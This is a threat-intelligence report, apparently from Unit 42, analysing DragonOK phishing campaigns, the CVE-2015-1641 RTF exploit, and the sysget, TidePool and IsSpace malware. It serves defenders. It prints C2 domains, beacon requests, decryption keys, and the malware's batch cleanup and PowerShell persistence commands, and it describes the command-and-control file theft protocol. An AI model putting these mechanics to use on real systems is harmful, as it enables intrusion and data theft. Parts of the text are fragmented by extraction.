We first discussed them in April 2015 when we\nwitnessed them targeting a number of organizations in Japan. In recent months, Unit 42 has observed a number of\nattacks that we attribute to this group. Multiple new variants of the previously discussed sysget malware family have\nbeen observed in use by DragonOK. Sysget malware was delivered both directly via phishing emails, as well as in\n[Rich Text Format (RTF) documents exploiting the CVE-2015-1641 vulnerability (patched in MS15-033) that in turn](https://en.wikipedia.org/wiki/Rich_Text_Format)\n[leveraged a very unique shellcode. Additionally, we have observed instances of the IsSpace and TidePool malware](http://researchcenter.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/)\nfamilies being delivered via the same techniques. While Japan is still the most heavily targeted geographic region by\nthis particular actor, we also observed instances where individuals or organizations in Taiwan, Tibet, and Russia also\nmay have been targeted.\n\n## Infiltration\n\nWe observed two unique techniques of infiltration for this particular campaign:\n\n1. Phishing emails being sent with malicious executables directly attached\n\n[2. Malicious RTF files which exploit CVE-2015-1641.](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641)\n\nThe phishing emails had the following characteristics:\n\n**Email Subjects**\n\n[Pickup at the Juanda Airport (1-Sep)](https://en.wikipedia.org/wiki/Juanda_International_Airport)\n\nポイントプレゼントのお知らせ [Roughly Translated: Point gift announcement]\n\n20周年記念パーティー [Roughly Translated: 20th Anniversary Party]\n\n参加者の10周年記念同窓会一覧 [Roughly Translated: List of participants’ 10th anniversary alumni\nassociation]\n\n子供の調査連れ [Roughly Translated: Children’s investigation]\n\nG20 report\n\n記念日の再会 [Roughly Translated: Anniversary reunion]\n\n最新の人事異動通知 [Roughly Translated: Recent personnel change notice]\n\n**Attachment Filenames**\n\nG20 report.exe\n\nexe\n\nList of Participants.exe\n\nRegistration form.exe\n\nThese emails targeted the following industries in Japan:\n\n\n-----\n\nEnergy\n\nTechnology\n\nSemiconductor\n\nThe malicious RTF files in question leverage a very specific shellcode to drop and execute the malicious payload,\nas well as a decoy document. Decoy documents are legitimate benign documents that are opened after the\nmalicious payload is delivered, thus ensuring that the victim does not become suspicious because their expected\ndocument opened as expected.\n\nTwo samples were found to include the decoy document show in Figure 1.\n\nThe title of the document roughly translates to “Ministry of Communications & Departments Authorities Empty Sites\nand Hosted Public Works Source Clearance Photos”. The use of traditional Chinese indicators the target likely\nresiding in either Taiwan, Hong Kong, or Macau. However, based on the Taiwanese subject matter in this document,\nwe can safely come to the conclusion that the intended victim was of Taiwanese origin. These samples delivered an\nupdated version of the IsSpace malware family, which was discussed previously in a watering hole attack targeting\nan aerospace firm. IsSpace is an evolved variant of the NFlog backdoor, which has been used by DragonOK in the\npast.\n\n\n-----\n\n_Figure 1 Taiwanese decoy document_\n\n\n-----\n\n[appears to be an internal newsletter from the Central Tibetan Ministry, as suggested by the logo used as well as the](http://tibet.net/information/)\ncontent of the document itself. This document indicates that the malware may have been targeted towards an\nindividual that is interested in Tibetan affairs. These particular samples were unique in that they delivered the\n[TidePool malware family that we reported on in May of 2016. We have not previously observed DragonOK using](http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-)\nTidePool in attacks.\n\n_Figure 2 Tibetan decoy document containing internal newsletter_\n\nWe also identified an additional sample using decoy targeting Taiwanese victims (Figure 3), which deployed a newer\nsysget sample.\n\n\n-----\n\n_Figure 3 Taiwanese-targeted decoy document_\n\nOther new samples associated with this group used a Russian language decoy document (Figure 4.) The decoy\ndocument in question discusses the GOST block cipher, which was created by the Russian government in the\n1970’s. The combination of Russian language and Russian-specific subject matter indicates that the intended victim\nspeaks Russian and may be interested in encryption. Like the previously discussed Tibetan decoy documents, these\nsamples also delivered the TidePool malware family.\n\n\n-----\n\n-----\n\nFinally, multiple samples used a traditional Chinese language decoy document that discussed a subsidy welfare\nadjustment program. The use of traditional Chinese indicators the target likely residing in either Taiwan, Hong Kong,\nor Macau. Similar to other attacks witnessed, a variant of the sysget malware family is installed by these files.\n\n\n-----\n\n## Malware Deployed\n\nIn looking at the various malware samples used in attempted attacks, the following four families were identified:\n\nSysget version 2\n\nSysget version 3\n\nTidePool\n\nIsSpace\n\nWe broke the sysget classification into multiple variants when we found that a number of changes have been made\nsince our April 2015 report. Major distinctions between the versions of sysget include the following:\n\n**Sysget version 2**\n\nRemoved support for persistence on Windows XP\n\nReworked the URIs used for network communication\n\nAdded additional layers of encryption for network communication and stored configuration files\n\nSwitched from RC4 to AES-128\n\n**Sysget version 3**\n\nNumerous anti-debug and anti-vm procedures added\n\nEncrypted URIs in network communication with an initial static key\n\nIn addition, we observed a sysget version 4 that was discovered in another sample during our research. This\nversion is not attributed to a specific attack against an organization.\n\nIndicators of compromise related to sysget version 4 and other samples not directly attributed to specific attacks\nmay be found in the Appendix of this blog post. Additionally, more information about the various sysget variants may\nalso be found in the Appendix.\n\nThe TidePool samples encountered are consistent with the samples previously discussed. I encourage readers to\n[view our previous blog post to learn more about the intricacies of this particular malware family.](http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/)\n\nThe IsSpace malware sample, however, looks to have been updated since [last we wrote on it. While the available](http://researchcenter.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/)\ncommands from the command and control (C2) server remains the same, the URI structure of the network\ncommunication has been modified. Additionally, the installation routine for this malware family has been updated to\nbe far less complex than previous discussed versions, favoring PowerShell to set persistence and forgoing the\npreviously used side-loading technique. A more detailed analysis of the new instances of IsSpace may be found at\nthe end of this blog post in the Appendix.\n\n## Infrastructure\n\nA number of unique domains were employed by the various Trojans used in these attacks. For the numerous\ninstances of sysget we observed, the following domains were observed for their C2:\n\nkr44.78host[.]com\n\nt i [ ]\n\n\n-----\n\nAll of the above domains have Chinese WHOIS registrant details. Additionally, the gotoimage[.]com and\ntrend.gogolekr[.]com are both registered to the same registrant and resolve to the same netblock of\n104.202.173.0/24.\n\nThe instances of TidePool identified communicated with the following C2 servers:\n\neurope.wikaba[.]com\n\nrussiaboy.ssl443[.]org\n\ncool.skywave[.]top\n\nThese domains did not have many definitive relations with the sysget C2 servers except for cool.skywave[.]top,\nwhich shared a unique registrant email with the sysget C2 server of trend.gogolekr[.]com. Additionally, the\ngeographic region of the resolved IPs was consistent with the previous set, as they all resolved to various regions in\nsoutheast Asia. Specifically, the domains resolved to China, Korea, and Taiwan in the past six months.\n\nThe IsSpace samples resolved to the following domains:\n\nwww.dppline[.]org\n\nwww.matrens[.]top\n\nThese domains had no apparent connections to the previously discussed C2 servers, other than the fact that they\nresolved to Korea and Hong Kong respectively. Additionally, the registrar of ‘Jiangsu Bangning Science and\ntechnology Co. Ltd.’ was used for a large number of domains. A full graph of the relations between the various\nattacks is shown in Figure 6.\n\n\n-----\n\nThe DragonOK group are quite active and continue updating their tools and tactics. Their toolset is being actively\ndeveloped to make detection and analysis more difficult. Additionally, they appear to be using additional malware\ntoolsets such as TidePool. While Japan is still the most-targeted region by this group, they look to be seeking out\nvictims in other regions as well, such as Taiwan, Tibet, and Russia.\n\nPalo Alto Network customers are protected against this threat in the following ways:\n\n[Malware families are tagged in AutoFocus via a variety of tags ( TidePool, NFlog, Sysget)](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Tidepool)\n\nThe following IPS signatures detect malicious network traffic:\n\nIPS signature 14365 (IsSpace.Gen Command And Control Traffic)\n\nIPS signature 14588 (Suspicious.Gen Command And Control Traffic)\n\nIPS signature 13574 (NfLog.Gen Command And Control Traffic)\n\nIPS signature 13359 (Nflog.Gen Command And Control Traffic)\n\nAll samples are appropriately marked malicious in WildFire\n\n## Appendix\n\n**CVE-2015-1641 Exploit and Shellcode**\n\nThis particular group uses a very specific shellcode payload when exploiting CVE-2015-1641. This CVE is memory\ncorruption vulnerability which allows for arbitrary code execution in various versions of Microsoft Office, including\n2007, 2010, and 2013.\n\nThe shellcode begins by dynamically loading a small number of API functions from kernel32. A number of hashes\nare included that represent function names, which have a rotate right 7 (ROR7) operation applied against them\nbefore being XORed against a key of “\\x10\\xAD\\xBE\\xEF”. The ROR7 operation is a very common technique in\nshellcode to obfuscate what functions are being called. The author added the XOR operation to add another layer of\nobfuscation.\n\n_Figure 7 API function hashes contained in shellcode_\n\n\n-----\n\nbeginning and ending of both an embedded malicious payload, as well as a decoy document.\n\nThe malicious executable is marked with a starting point of 0xBABABABABABA and an end marker of\n0xBBBBBBBB. The decoy document is found immediately after the end of the malicious payload, and has an end\nmarker of 0xBCBCBCBC. Both executables are encrypted with a 4-byte XOR key. Should the original data contain\n0x00000000, it will not have the XOR applied against it.\n\nThe malicious payload is XORed against a key of 0xCAFEBEEF and the decoy document is XORed against\n0xBAADF00D. The following script may be applied against the RTF document to extract both the malicious payload\nand the decoy:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\nimport sys, binascii\nfrom itertools import cycle, izip\nimport re\n\ndef xor(message, key):\nreturn ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))\n\ndef decrypt(data, key):\noutput = \"\"\niteration = 4\nposition = 0\nwhile True:\nwindow = data[position:position+iteration]\nif window == \"\\x00\\x00\\x00\\x00\":\noutput += window\nelse:\noutput += xor(window, key)\nposition += iteration\nif position == len(data) or position > len(data):\nbreak\nreturn output\n\ndef extract(data):\nexe_data, doc_data = None, None\nexe_starting_point = data.index(\"\\xBA\\xBA\\xBA\\xBA\\xBA\\xBA\") + 6\nexe_ending_point = None\nending_points = [m.start() for m in re.finditer(\"\\xBB\\xBB\\xBB\\xBB\", data)]\nfor e in ending_points:\nif e > exe_starting_point:\nexe_ending_point = e\nif exe_starting_point and exe_ending_point:\nmz_data = data[exe_starting_point:exe_ending_point]\nexe_data = decrypt(mz_data, \"\\xBE\\xBA\\xFE\\xCA\")\nelse:\nraise Exception(\"Unable to find correct offsets for executable.\")\n\ndoc_starting_point = exe_ending_point + 4\ndoc_ending_point = None\nending_points = [m.start() for m in re.finditer(\"\\xBC\\xBC\\xBC\\xBC\", data)]\nfor e in ending_points:\nif e > doc_starting_point:\ndoc_ending_point = e\n\n\n-----\n\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\ndoc_data decrypt(doc, \\x0D\\xF0\\xAD\\xBA )\nelse:\nraise Exception(\"Unable to find correct offsets for document.\")\nreturn [exe_data, doc_data]\n\ndef main():\ninput_file = sys.argv[1]\ninput_fh = open(input_file, 'rb')\ninput_data = input_fh.read()\ninput_fh.close()\nexe, doc = extract(input_data)\n\nfilename = \"{}.exe\".format(input_file)\noutput_file = open(filename, 'wb')\noutput_file.write(exe)\noutput_file.close()\nprint \"[+] Wrote {}\".format(filename)\n\nfilename = \"{}.doc\".format(input_file)\noutput_file = open(filename, 'wb')\noutput_file.write(doc)\noutput_file.close()\nprint \"[+] Wrote {}\".format(filename)\n\nif len(sys.argv) == 2 and __name__ == \"__main__\":\nmain()\n\n\nWhen both files are decrypted, they are written to the following location in the %TEMP% directory:\n\n../..exe\n\n../..doc\n\nNote the initial ‘..’, which represents the parent directory of %TEMP%. This coupled with the unusual names of ..exe\nand ..doc make this particular shellcode very unique, which is one way we have attributed these samples to the\nsame group. After the samples have been written, they are executed via calls to WinExec.\n\n## Sysget v2 Analysis\n\nOne of the fundamental changes witnessed in the second iteration of sysget is removing support for Windows XP\nand lower. Other changes include modifications to the URIs used for network communication.\n\nLike the original version of sysget, sysget v2 still uses a named event of ‘mcsong[]’ to ensure a single instance is\nrunning at a time. It proceeds to make attempts at copying itself to the %STARTUP%/notilv.exe path. However, it\nuses COM objects to perform this action that is not available in Windows XP, which prevents the malware from\ninstalling itself to this location. While the remainder of the malware operates as expected, it will not survive a restart\nof the system.\n\nSysget proceeds to make an attempt at reading the following configuration file. This filename and path has changed\nsince the original version, and is consistent in the subsequent versions.\n\n%APPDATA%/vklCen5.tmp\n\n\n-----\n\nfrom the previous version, where RC4 was used for all encryption operations. The following Python code may be\nused to decrypt this file:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nimport sys\nimport base64\nfrom wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptDecrypt\n\ndef decrypt(data, original_key):\nCALG_AES_128 = 0x660E\nCALG_MD5 = 0x8003\nmd5_hasher = CryptCreateHash(CALG_MD5)\nCryptHashData(md5_hasher, original_key)\nkey = CryptDeriveKey(md5_hasher, CALG_AES_128)\ndecrypted_data = CryptDecrypt(key, data)\nreturn decrypted_data\n\narg = open(sys.argv[1], 'rb').read()\nprint repr(decrypt(arg, '734thfg9ih'))\n\n\nWhen executed against an example configuration file, we see the following output, which includes the two pieces of\ndata noted previously:\n\n\n1\n2\n3\n4\n\n\nC:\\>python decrypt_config.py vklCen5.tmp\n'gh1443717133\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x001059086204\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n\nThe encryption of this configuration file is a new feature that was not present in the original version of sysget.\n\nIf this file is not present on the system, the malware will attempt to retrieve the necessary information via a HTTP\nrequest. The following request is made to the remote command and control server. Note that the full URI is statically\nset by the malware sample.\n\n\n1\n2\n3\n4\n5\n6\n\n\nGET /index.php?type=read&id=1420efbd80ce02328663631c8d8f813c&pageinfo=jp&lang=\nutf-8 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/40.0.2214.115 Safari/537.36\nHost: hello.newtaiwan[.]top\n\n\nThe server responds with the following data, encrypted using the same technique previously described with a static\nkey of ‘aliado75496’. Once decrypted, we see the following example data being sent back to sysget:\n\ngh1443717133\\n1059086204\\n\n\nThe first string is used as a key for all subsequent network communication. The second string is treated as a unique\nvictim identifier. This data is encrypted using the key of ‘734thfg9ih’ and written to the %APPDATA%/vklCen5.tmp\nfile.\n\nAfter this information has been obtained, the malware proceeds to enter its command and control loop. An HTTP\nrequest such as the following is made to the remote server. Note that the ‘mid’ GET variable holds the MD5 hash of\n\n\n-----\n\n2\n3\n4\n5\n\n\n30a30716ed4 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/40.0.2214.115 Safari/537.36\nHost: hello.newtaiwan[.]top\n\n\nThe response is encrypted using the unique key that was obtained previously. Should the response contain ‘Fatal\nerror’ unencrypted, no further actions are taken by the malware sample. Once decrypted, the response may have\none of the following two choices, and their accompanying purpose. Alternatively, if a raw command is provided, the\nmalware will execute it and return the results.\n\n**Command** **Description**\n\ngoto wrong “[file_path]”;\\n Read a specific file and return its contents.\n\n\ngoto right “[filename]”\n“[identifier]”\n\n\nWrite a given file. The identifier is used to retrieve the file’s contents in a\nsubsequent HTTP request.\n\n\nWhen the ‘goto wrong’ request is made, a HTTP POST request is made to the following URI. In the following URI,\nthe ‘list’ parameter contains the MD5 hash of the victim’s identifier.\n\n/index.php?type=register&pageinfo=myid32987&list=5717cb8fed2750a2ee9e830a3\n0716ed4\n\nThe contents of this POST request contains the victim’s identifier, as well as the file’s contents encrypted with the\nunique key. The first 50 bytes are reserved for the victim identifier, as shown below:\n\n\n1\n2\n3\n4\n\n\n0000016F 35 37 31 37 63 62 38 66 65 64 32 37 35 30 61 32 5717cb8f ed2750a2\n0000017F 65 65 39 65 38 33 30 61 33 30 37 31 36 65 64 34 ee9e830a 30716ed4\n0000018F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n0000019F 00 00 4b 59 bc 53 53 99 2b 6f a7 b5 5a 85 c7 66 ..KY.SS. +o..Z..f\n\n\nOnce decrypted, the data contains both the filename, as well as the contents of that file.\n\n\n1\n2\n\n\ntest.txt\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[TRUNCATED]\\x\n00\\x00\\x00file contents\n\n\nIf the ‘goto right’ command is used, the malware will make a subsequent request to the following URI. The ‘cache’\nvariable holds the unique identifier that was provided in the ‘goto right’ command.\n\n/index.php?type=goto&pageinfo=myid47386&cache=identifier\n\nOnce the file contents are obtained, they are written to the specified filename in the %STARTUP% folder.\n\nWhen a raw command is received, the malware will upload the results to the following URI via a POST request:\n\n/index.php?type=register\n\nAn overview of the network communications exhibited by sysget version 2 can be seen in the figure below.\n\n\n-----\n\n-----\n\n_Figure 8 Sysget version 2 command and control flow_\n\n## Sysget v3 Analysis\n\nSome of the biggest changes witnessed in version 3 of sysget includes numerous anti-debug and anti-vm detections\nadded, as well as the encryption of the URIs used for network communication.\n\nWhen the malware initially executes, it performs the following checks to ensure it is not being debugged and not\nrunning in a sandbox or virtualized environment.\n\nShould these checks return false, the malware proceeds to enter its installation routine. The malware originally\ncopies itself to a temp file in the %TEMP% directory with a filename prefix of ‘00’. It proceeds to append 4194304\nbytes of randomly chosen data to the end of this file. The increased filesize may have been added by the author in\nan attempt to thwart sandboxes that impose filesize limits on what is saved and/or processed. Finally, the malware\ncopies the original file from the tmp path to the %STARTUP%/winlogon.exe path using the same technique\nwitnessed in version 2. Sysget then writes a batch script in the %TEMP% folder with the following contents, cleaning\nup the original files and spawning the newly written winlogon.exe executable:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@echo off\n:t\ntimeout 1\nfor /f %%i in ('tasklist /FI \"IMAGENAME eq [original_executable_name]\" ^| find /v /c \"\"' ) do set YO=%%i\nif %%YO%%==4 goto :t\ndel /F \"[original_executable_path]\"\ndel /F \"[tmp_file]\"\nstart /B cmd /c \"[startup_winlogon.exe]\"\ndel /F \"[self]\"\nexit\n\n\nAfter installation, sysget will attempt to read the same %APPDATA%/vklCen5.tmp file as witnessed in the previous\nvariant. A number of strings within the malware, including the ‘734thfg9ih’ key used to encrypt this file, have been\nobfuscated via a single-byte XOR of 0x5F.\n\nSimilar to previous versions, should this vklCen5.tmp file not be present on the victim machine, it will make an\nexternal HTTP request to retrieve the necessary information. The following request is made by the malware.\nReaders will notice that the URI has changed from previous versions in a number of ways. This version of sysget\nlooks to always make requests to 1.php, which is hardcoded within the malware itself. Additionally, all HTTP URIs in\nthis version of sysget are encrypted. The initial GET request made to retrieve the victim identifier and unique key is\nencrypted with a key of ‘Cra%hello-12sW’. The subsequent response containing this information is then decrypted\nusing a key of ‘aliado75496’, which is consistent with previous versions.\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n\n\n/1.php?K+50lkzq7OtigRtWY7Z5DwkmxRhFd5n3UXyH+Flfa0S8f5h3nl6XBDMa6a3IbDiPQqW\nSwZh7lQRmIPLlC8Wmfr8cGv7raGEV160r73FJjnOfyJPLEKWAIyJnfPZhHdGapA6tfwfwj24TN\n4QbBrMJkVCLPPZoI4HNtdDEo6G3ujjyvkpWnGQnRBi6DzylNrMypV/K6Ft32dsMmmO52q4IdQ==\nHTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/40.0.2214.115 Safari/537.36\nHost: gtoimage.com\n\n\nWhen the URI above is base64-decoded and subsequently decrypted, we see the following:\n\nindex.php?type=read&id=692fdc3c7b2c310fc017e4af335b8dc8&pageinfo=jp&lang=utf-8\n\nThis URI is consistent with the previous sysget variant. It would seem the authors simply have added this layer of\nencryption to hinder efforts to block the malware via network-based detections.\n\nAfter this initial request to retrieve the victim identifier and unique key, sysget enters its command and control loop.\nThis process is consistent with the previous version, but simply has the extra layer of encryption used for the URIs.\n\n## Sysget v4 Analysis\n\nThe fourth variant of sysget is nearly identical to the third variant. However, the main difference lies in the URIs used\nfor network communication. In addition to the expected encryption of the URIs, this variant also mangles the base64\nencoding that is performed afterwards. The following Python script may be used to de-obfuscate the base64 URI\nfound in this variant:\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n'''\nURI Request:\n\nGET\n/5.php?62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0\nAMo+rT4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+\nBGFsc3wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed\n99 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/40.0.2214.115 Safari/537.36\nHost: www.sanseitime.com\n'''\n\nuri_string =\n\"62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0AMo+rT\n4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+BGFsc3\nwtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed99\"\n\nb64_string =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"\nprefix_int = int(uri_string[0:2])\nout = \"\"\n\nfor u in uri_string[2:]:\nind = b64_string.index(u) - prefix_int\nout += b64_string[ind]\n\ndecoded = base64.b64decode(out)\n\n\nAdditionally, the C2 URI changes in this variant, from 1.php to 5.php\n\n## IsSpace Analysis\n\nWhen initially run, IsSpace will create a unique event to ensure a single instance of the malware is running at a\ngiven time. This event name appears to be unique per the sample, as multiple samples contained unique event\nnames. The following event names have been observed in the samples that were analyzed:\n\ne6al69MS5iP\n\nv485ILa3q5z\n\nIsSpace proceeds to iterate over the running processes on the system, seeking out the following two process\nsubstrings:\n\nuiSeAgnt\n\navp.exe\n\nThe uiSeAgnt string may be related to Trend Micro’s solutions, while avp.exe most likely is related to Kaspersky’s\nanti-malware product.\n\nIn the event uiSeAgnt is identified, the malware will enter its installation routine if not already running as ‘bfsuc.exe’\nand proceeds to exit afterwards Should avp exe be identified the malware enters an infinite sleep loop until a\n\n\n-----\n\nThe malware then determines if it is running under Windows XP. In the event that it is, it will make a HTTP GET\nrequest to www.bing.com, presumably to ensure network connectivity.\n\n_Figure 9 IsSpace connecting to www.bing.com_\n\nIf the malware is not running on Windows XP, it will attempt to obtain and decrypt any basic authentication\ncredentials from Internet Explorer. This information is used in subsequent HTTP requests in the event a 407 (Proxy\nAuthentication Required) or 401 (Unauthorized) response code is received during network communication.\n\nIsSpace will then enter its installation routine, where it will first copy itself to the %LOCALAPPDATA% folder with a\nname of ‘bfsuc.exe’. It then sets the proper registry key for persistence by executing the following PowerShell\ncommand:\n\n\n1\n2\n3\n4\n\n\nC:\\Windows\\system32\\cmd.exe /C Powershell.exe New-ItemProperty -Path\nHKCU:SOFTWARE\\MICROSOFT\\Windows\\CurrentVersion\\Run -Name Identity PropertyType String -Value c:\\users\\josh grunzweig\\appdata\\local\\bfsuc.exe\n-force\n\n\nThe malware then makes an initial HTTP POST request to the configured C2 server. It will make this request to the\n‘/news/Senmsip.asp’ URI. The POST data is XORed against a key of “\\x35\\x8E\\x9D\\x7A”, which is consistent with\nprevious versions of IsSpace and NFlog. Decrypted, the POST data reads “01234567890”. The C2 server in turn\nwill respond with the victim’s external IP address.\n\n_Figure 10 Initial IsSpace beacon_\n\nIsSpace then spawns two threads that will make HTTP requests to the following URIs:\n\n/news/Sennw.asp?rsv_info=[MAC_ADDRESS]\n\n/news/Sentire.asp?rsv_info=[MAC_ADDRESS]\n\nThe ‘Sennw.asp’ POST requests that are made contain collected victim information. They, like other information sent\nacross the network, are encrypted using the previously mentioned 4-byte XOR key. When decrypted, we are\nprovided with information such as the following:\n\n\n-----\n\n2\n3\n\n\nLJLV2NKIOKP#%#Win7#%#English(US)#%#2016-12-20\n16:27:12#%#Active#%#xp20160628#%#IsAdmins#%#False\n\n\nThe information, delimited via ‘#%#’, is as follows:\n\n**Value** **Description**\n\n60-F8-1D-CC-2F-CF MAC address\n\n172.16.95.1 External IP collected previously\n\n172.16.95.186 Internal IP address\n\nWIN-LJLV2NKIOKP Hostname\n\nWin7 Windows version\n\nEnglish(US) Language\n\n2016-12-20 16:27:12 Timestamp\n\nActive Malware status. May also be ‘Sleep’\n\nxp20160628 Potential campaign identifier\n\nIsAdmins / False User admin status\n\nThe malware is expected to return one of the following two responses to this HTTP request:\n\nActive\n\nSlient (Note the typo)\n\nIn the event the response of Slient is received, the malware will stop sending out HTTP requests to the ‘Sentire.asp’\nURI. Conversely, if the malware is set to the ‘Sleep’ status and the ‘Active’ response is received, it will begin the\n‘Sentire.asp’ requests once more.\n\nThe requests to ‘Sentire.asp’ act as the main C2 loop, requesting commands from the remote server. The\ncommands are consistent with previously observed instances of IsSpace, however, the URIs have been modified.\n\n**Command** **Description** **Response URI**\n\nCMD Executes command
